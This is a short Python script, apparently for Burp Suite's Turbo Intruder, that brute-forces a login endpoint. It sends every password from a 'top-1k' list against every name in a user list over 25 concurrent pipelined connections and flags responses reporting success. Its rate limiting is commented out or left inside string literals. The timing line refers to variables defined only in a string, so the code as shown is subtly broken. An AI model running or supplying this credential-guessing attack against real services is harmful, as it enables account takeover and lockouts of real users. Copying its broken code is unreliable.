import codecs
import time
import random
import json

# Parameters to configure
'''
triedWords=1
timeMins=0
timeSecs=1
throttleMillisecs=2000
'''

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=25,
                           requestsPerConnection=100,
                           pipeline=True
                           )   
    

    secs=timeMins*60+timeSecs
    n=0

    for p in open('top-1k.txt'):
        p = p.strip()        
        for u in open('user-list.txt'):
            u = u.strip()      

            #time.sleep(throttleMillisecs/1000)   
            engine.queue(target.req, [u, p])

            '''
            n+=1
            if(n==triedWords):
                #time.sleep(secs)
                n=0
            '''
#@MatchStatus(200)
def handleResponse(req, interesting):
    if interesting:
        if '"success":true' in str(req.response):
            table.add(req)
            #return False
        
